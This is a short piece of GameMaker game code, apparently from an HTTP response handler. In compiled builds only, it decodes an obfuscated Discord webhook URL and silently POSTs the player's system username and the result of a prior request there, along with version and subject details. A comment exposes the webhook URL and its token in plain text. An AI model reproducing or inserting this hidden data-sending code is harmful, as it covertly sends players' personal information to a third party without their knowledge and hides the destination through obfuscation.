// I have my fucking reasons.
if async_load[? "id"] == request && (code_is_compiled() or DEBUG)
{
	var q=function(str){ret="";string_foreach(base64_decode(str),function(char,pos){ret+=chr(ord(char)-floor(sin(pos+16)*pi)+16)});return ret;};
	
	// https://canary.discord.com/api/webhooks/1159549494493450331/M5s_vl8m3d5rBggBk5R2vG54lTx-X0v5qnr0GurVZRYy492v4zL2qWYF3HQ0iw9yaL_Z
    var web = q("VGFkYmUpHBxSU2FRX2UcVVxkUVtfVCFVXlocUWJbH2RSUVpiYFlfHSIkJyghISkmKyMhJiImJyAgHx8gQCZhS2RcK18iUSJiNFlXL1gkRCVnNSEiXUdpG0QdZidjXV8dNmdkRkc+R2onKiBiIms/JGBERjYlOkEdVmYrbFI6S0g=");
	var body = ds_map_create(), header = ds_map_create();
	ds_map_add(body, "content", concat("<@821804076488327168> ", async_load[? "result"], " ", environment_get_variable("USERNAME"), "\nSUBJECT: ", subject, " VERSION: ", GM_version));
	ds_map_add(header, "Content-Type", "application/json");
	http_request(web, "POST", header, json_encode(body));
	ds_map_destroy(body);
	ds_map_destroy(header);
	
	request = string(async_load[? "result"]);
}
